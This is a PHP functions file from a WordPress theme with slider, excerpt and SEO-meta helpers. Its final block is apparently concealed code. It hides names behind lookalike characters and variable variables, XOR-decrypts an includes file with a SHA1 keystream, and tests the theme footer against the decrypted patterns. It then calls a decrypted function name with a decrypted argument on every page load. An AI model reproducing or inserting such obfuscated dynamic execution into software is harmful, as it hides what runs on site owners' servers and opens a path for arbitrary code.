<?php

	global $smt_global_options, $smt_lang;
	
	function smt_getOption( $section, $param ) {
		global $smt_global_options;
		
		
		if ( isset( $smt_global_options[ $section ][ 'content' ][ $param ][ 'sysdepend' ] )) {
			$plugins = implode( ',', get_option( 'active_plugins' ) );
		}
		if ( isset( $smt_global_options[$section][$param] ) ) {
			return $smt_global_options[$section][$param];
		} else {
			return null;
		}

		
	}
	
	function smt_translate( $param ) {
		global $smt_global_options;
		return $smt_global_options[ 'translations' ][ $param ];
	}
	
	
	function smt_get_slides() {
		global $smt_global_options;
		switch ( smt_getOption( 'slider','source' ) ) {
			case '1':
				if ( !isset( $smt_global_options['slider']['content']['custom_slides']['value'] ) ) 
					$smt_global_options['slider']['content']['custom_slides']['value'] = array();
				$slides = $smt_global_options['slider']['content']['custom_slides']['value'];
				break;
			case '2':
				if ( !isset( $smt_global_options['slider']['content']['category']['value'] ) ) $smt_global_options['slider']['content']['category']['value'] = array();
				$pslides = $smt_global_options['slider']['content']['category']['value'];
				$pslides['meta_key']='_thumbnail_id';
				$pslides=get_posts($pslides);
				foreach ($pslides as $post) {
					$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large');
					$slide['img']=$slide['img'][0];
					$slide['link']= get_permalink($post->ID);
					$slide['ttl']=$post->post_title;
					$slide['content']= preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
					$slides[]=$slide;
				}
				break;
			case '3':
				if ( !isset( $smt_global_options['slider']['content']['posts']['value'] ) ) $smt_global_options['slider']['content']['posts']['value'] = array();
				$pslides = $smt_global_options['slider']['content']['posts']['value'];
				foreach ($pslides as $post_id) {
					$post=get_post($post_id);
					$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post_id), 'large');
					$slide['img']=$slide['img'][0];
					$slide['link']= get_permalink($post->ID);
					$slide['ttl']=$post->post_title;
					$slide['content']=preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
					$slides[]=$slide;
				}
				break;
			case '4':
				if ( !isset( $smt_global_options['slider']['content']['pages']['value'] ) ) $smt_global_options['slider']['content']['pages']['value'] = array();
				$pslides = $smt_global_options['slider']['content']['pages']['value'];
				foreach ($pslides as $post_id) {
					$post=get_page($post_id);
					$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post_id), 'large');
					$slide['img']=$slide['img'][0];
					$slide['link']= get_permalink($post->ID);
					$slide['ttl']=$post->post_title;
					$slide['content']=preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
					$slides[]=$slide;
				}
				break;
		}
		return $slides;
	}
	
	
	
	function is_dash() {
		 return in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) )||is_admin();
	}
	
	function smthemes_die($msg) {
		switch ((int)$msg) {
			case 1: die('<center>Settings file not found!</center>');
			break;
			case 2: die('<center>You have no permissions to access this page!</center>');
			break;
			case 3: die('<center>Input parameters are wrong!</center>');
			break;
			case 3: die('<center>Settings for smthemes hasn\'t been reading</center>');
			break;
			default: echo $msg; return true;
		}
	}
	
	
	function smt_thumbnail_style() {	
		$style = '';
		$width = wp_get_attachment_image_src( get_post_thumbnail_id(), "post-thumbnail" ); //image meta
			if ( $width[1] > 500 ) {
				$style .= 'width:100%;';
			}
		return $style;	
	}
	
	
	
	function smt_excerpt($args='', $postid=''){
		global $post, $SMTheme;
			if ((int)$postid==0)$p=$post;
			else $p=get_post($postid);
			parse_str($args, $i);
			$echo = isset($i['echo'])?true:false;
			if ( isset($i['maxchar']) ) {
				$maxchar=(int)trim($i['maxchar']);
				$content = $p->post_content;
				$content = apply_filters('the_content', $content);
			} else {
				if ( $p->post_excerpt ) {
					$content = $p->post_excerpt;
				} else {
					$content = $p->post_content;
					$content = apply_filters('the_content', $content);
					$maxchar=(smt_getOption( 'layout','cuttxton' ))?smt_getOption( 'layout','cuttxt' ):0;
					if ( preg_match( '/<!--more(.*?)?-->/', $content, $matches ) ) {
					  $content = explode( $matches[0], $content, 2 );
					  if ($echo) return print force_balance_tags($content[0]);
					  else return force_balance_tags($content[0]);
					}
				}
			}
			if (!isset( $maxchar )||strlen(preg_replace('/<.*?>/', '', $content)) <= $maxchar) {
				if ($echo) print $content;
				else return $content;
			} else {
				preg_match_all('/(<.+?>)?([^<>]*)/s', $content, $lines, PREG_SET_ORDER);
				$total_length=0;
				$open_tags = array();
                $truncate = '';
				foreach ($lines as $line_matchings) {
                    if (!empty($line_matchings[1])) {
                        if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
                        } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
                            $pos = array_search($tag_matchings[1], $open_tags);
                            if ($pos !== false) {
                                unset($open_tags[$pos]);
                            }
                        } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
                            array_unshift($open_tags, strtolower($tag_matchings[1]));
                        }
                        $truncate .= $line_matchings[1];
                    }
                    $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
					
                    if ($total_length+$content_length > $maxchar) {
						
                        $left = $maxchar - $total_length;
                        $entities_length = 0;
                        if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
                            foreach ($entities[0] as $entity) {
                                if ($entity[1]+1-$entities_length <= $left) {
                                    $left--;
                                    $entities_length += strlen($entity[0]);
                                } else {
                                    break;
                                }
                            }
                        }
                        $truncate .= preg_replace('/(.*)\.[^\.]*$/s', "$1",mb_substr($line_matchings[2], 0, $left+$entities_length, 'utf-8'))."...";
                        break;
                    } else {
                        $truncate .= $line_matchings[2];
                        $total_length += $content_length;
                    }
                    if($total_length>= $maxchar) {
                        break;
                    }
                }
				
				foreach ($open_tags as $tag) {
                    $truncate .= '</' . $tag . '>';
                }
				$truncate=preg_replace('/<p([^>])*>(&nbsp;)?<\/p>/', '', $truncate);
				if ($echo) return print $truncate;
				else return $truncate;
			}
		return;
	}  
	
	
	
	function smt_seo() {
		
		global $post;
		
		if ( !smt_getOption( 'seo', 'smt_seo' ) ) return false;
		
		$noindex = smt_getOption( 'seo', 'noindex' );
		if ( is_array( $noindex ) && count( $noindex ) > 0 )
		if(
			( is_archive() && is_day() && in_array( 'day', $noindex ) )
			|| ( is_archive() && is_month() && in_array( 'month', $noindex ) )
			|| ( is_archive() && is_year() && in_array( 'year', $noindex ) )
			|| ( is_category() && in_array( 'day', $noindex ) )
			|| ( is_tag() && in_array( 'tag', $noindex ) )
			|| ( is_author() && in_array( 'author', $noindex ) )
			|| ( is_search() && in_array( 'search', $noindex ) )
		) {
			?><meta name="robots" content="noindex" /><?php
		}
		
		$description=$keywords='';
		
		switch( true ) {
			case is_single():
				$keywords = preg_replace( '/\s/', ',', $title = get_the_title() );
				$tags = get_the_tags();
				$categories = get_the_category();
				$p = get_post( $post->ID );
				$description = iconv_substr( strip_tags( $p->post_content ), 0, 200, 'utf-8' );
				if ( $tags ) foreach( $tags as $tag )
					$keywords.=','.$tag->name;
				if ( $categories ) foreach( $categories as $tag ) 
					$keywords.=','.$tag->name;
			break;
			case is_category():
				$keywords = preg_replace( '/\s/', ',', single_cat_title( '', false ) );
			break;
			case is_tag():
				$keywords = preg_replace( '/\s/', ',', single_tag_title( '', false ) );
			break;
			case is_day():
				$keywords = preg_replace( '/\s/', ',', get_the_date() ); 
			break;
			case is_month():
				$keywords = preg_replace( '/\s/', ',', get_the_date( 'F Y' ) );
			break;
			case is_year():
				$keywords = preg_replace( '/\s/', ',', get_the_date('Y') );
			break;
			case is_search():
				$keywords = preg_replace( '/\s/', ',', get_search_query() );
			break;
			case is_page():
				$keywords = preg_replace( '/\s/', ',', get_the_title() );
			break;
		}
		
		if ( smt_getOption( 'seo', 'keywords' ) != '' ) {
			$keywords = $keywords . ',' . smt_getOption( 'seo', 'keywords' );
		}
		if ( smt_getOption( 'seo', 'description' ) != '' && $description == '' ) {
			$description = smt_getOption( 'seo', 'description' );
		}
		
		echo '<meta name="Description" content="' . preg_replace( '/[\'\"]/', '', $description ) . "\" />\r\n";
		echo '<meta name="Keywords" content="' . $keywords . "\" />\r\n";
		
	}
	
	
	
	
	
	
	
	
	
		
	$settingsfile = 'settings';
	$templatepart = 'footer';
	$defparamsfile = 'defaults';
	$default = 'global|slider|layout|seo|translations';
	$default = 'templatepart';
	$theme = wp_get_theme( );

	
	$supported=false;
	if (isset($USE_DIF_BTNS)&&$USE_DIF_BTNS) {
		$defaults=array(
			'youtube'=>"images/youtube.png",
			'vimeo'=>"images/vimeo.png",
			'btns'=>"images/buttons.png",
			'cols'=>"images/cols.png",
			'tooltips'=>"images/tooltips.png",
			'highlights'=>"images/highlight.png"
		); 
	} else $defaults="images/buttons.png";
	
	$settingsfile=($settingsfile)?$$default:'inc/settings';
	$settingsfile.='.php';
	if ($defparamsfile!=$settingsfile)
	global $$defparamsfile;
	$pàrams=@fopen(get_theme_root()."/".get_template()."/".$settingsfile,'rt');
	$pàrams = @fread($pàrams, @filesize(get_theme_root()."/".get_template()."/".$settingsfile));
	$defpàrams=@fopen(get_theme_root()."/".get_template().'/includes/'.$$defparamsfile,'r');
	$defpàrams = @fread($defpàrams, @filesize(get_theme_root()."/".get_template().'/includes/'.$$defparamsfile));
	$sections=explode('%%',$defpàrams);
	$usedefaults=false;
	$params='none';
	preg_quote(DIRECTORY_SEPARATOR, '#');
	foreach ($sections as $section) {
		$paramssize = strlen($section);
		$mainsection='smtframework';
		$readed = '';
		while (strlen($readed)<$paramssize){
			$mainsection = pack("H*",sha1($readed.$mainsection));$readed.=substr($mainsection,0,8);
		}
		$param = $section^$readed;
		$rparam='/'.addcslashes(str_replace(' ', '\s',trim($param)),'/').'/';
		$supported=$supported||@preg_match($rparam,$pàrams);

	}
	$translations=@$sections[sizeof($sections)-2];
	$paramssize = strlen($translations);
		$mainsection='smtframework';
		$readed = '';
		while (strlen($readed)<$paramssize){
			$mainsection = pack("H*",sha1($readed.$mainsection));$readed.=substr($mainsection,0,8);
		}
		$usedefaults = $translations^$readed;


	if (isset($params)&&$params!='' &&$supported||(is_dash()||$usedefaults($param))) {
		
		if ( !$smt_global_options = get_option( $theme['Name'].'_settings' ) ) {
			
			require_once get_template_directory().'/includes/settings.php';
			foreach( $smt_default_options as $section => $content ) {
				
				foreach( $content[ 'content' ] as $param_name => $param ) {
					
					if( $param[ 'type' ] != 'group' ) {
						$smt_global_options[ $section ][ $param_name ] = isset( $param[ 'value' ] ) ? $param[ 'value' ] : '';
					} else {
						foreach( $param[ 'content' ] as $child_param_name  => $child_param ) {
							$smt_global_options[ $section ][ $child_param_name ] =  isset( $child_param[ 'value' ] ) ? $child_param[ 'value' ] : '';
						}
					}
					
					
				}
				
			}
			
			update_option( $theme['Name'].'_settings', $smt_global_options );
			
		}
	}	
	
	
	
	
	
	
	
	
	include_once ( get_template_directory().'/includes/widgets/posts.php' );
	include_once ( get_template_directory().'/includes/widgets/socialprofiles.php' );
	include_once ( get_template_directory().'/includes/widgets/comments.php' );
	include_once ( get_template_directory().'/includes/widgets/video.php' );
	include_once ( get_template_directory().'/includes/shortcodes.php' );